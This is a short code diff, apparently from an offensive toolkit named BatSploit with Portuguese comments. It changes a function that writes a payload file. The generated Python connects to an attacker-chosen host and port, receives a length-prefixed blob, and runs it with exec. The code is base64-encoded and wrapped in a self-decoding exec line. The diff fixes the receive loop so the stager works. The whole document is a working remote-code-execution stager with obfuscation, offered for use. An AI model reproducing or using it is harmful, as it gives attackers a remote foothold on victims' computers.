@@ -286,12 +286,13 @@ class BatSploit(object):
 			code = "import socket,struct\n"
 			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
 			code += "s.connect(('%s', %i))\n"%(host, port)
-			code += "l=struct.unpack('>I',s.recv(4))[0]\n"
-			code += "while s.recv(l)<l:\n"
-			code += "	s.recv(l-len(s.recv(l)))\n"
-			code += "exec(s.recv(l),{'s':s})"
-			encode = code.encode('base64').encode('base64').replace("\n", "") # isso codifica o código
-			payload_coded = "exec('%s'.decode('base64').decode('base64'))"%(encode) # isso decodifica e executa o payload
+			code += "packet=struct.unpack('>I',s.recv(4))[0]\n"
+			code += "data=s.recv(packet)\n"
+			code += "while len(data)<packet:\n"
+			code += "	data+=s.recv(packet-len(data))\n"
+			code += "exec(data,{'s':s})"
+			encode = code.encode('base64').replace("\n", "") # isso codifica o código
+			payload_coded = "exec('%s'.decode('base64'))"%(encode) # isso decodifica e executa o payload
 			payload_file = open(name, 'w') # abri o arquivo dst
 			payload_file.write(payload_coded) # escreve o código no arquivo
 			payload_file.close() # fecha o arquivo
